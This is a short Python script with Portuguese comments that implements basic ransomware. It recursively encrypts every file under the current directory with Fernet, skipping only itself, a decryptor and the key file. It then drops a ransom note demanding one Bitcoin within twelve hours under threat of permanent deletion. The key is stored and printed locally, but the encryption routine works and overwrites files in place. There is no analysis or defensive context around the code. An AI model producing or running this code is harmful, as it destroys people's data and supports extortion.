import os
from cryptography.fernet import Fernet

# Gerar chave de criptografia
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_arquivo:
        chave_arquivo.write(chave)

# Carregar chave
def carregar_chave():
    return open("chave.key", "rb").read()

# Criptografar arquivo
def criptografar_arquivo(arquivo, chave):
    chave = Fernet(chave)
    with open(arquivo, "rb") as arq:
        dados = arq.read()
    dados_criptografados = chave.encrypt(dados)
    with open(arquivo, "wb") as arq:
        arq.write(dados_criptografados)

# Encontrar arquivos para criptograr
def encontrar_arquivos(diretorio):
    lista_arquivos = []
    for root, dirs, files in os.walk(diretorio):
        for nome in files:
            path = os.path.join(root, nome)
            if nome != "main.py" and nome != "descriptografar.py" and not nome.endswith(".key"):
                lista_arquivos.append(path)
    return lista_arquivos

# Mensagem de resgate
def mensagem_resgate():
    with open("RECUPERAR OS DADOS.txt", "w") as arquivo:
        arquivo.write('''Seus arquivos foram criptografados!
Para recuperar seus arquivos, envie 1 Bitcoin e o comprovante para o endereço abaixo:
a1b2d3c4e5f6...
Após isso, será enviada a chave de descriptografia.
Você tem 12 horas para realizar o pagamento, caso contrário, todos os dados serão permanentemente excluídos, sem possibilidade de recuperação.''')

# Main
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos(os.getcwd())
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    mensagem_resgate()

    print("Encryption key:", chave)

if __name__ == "__main__":
    main()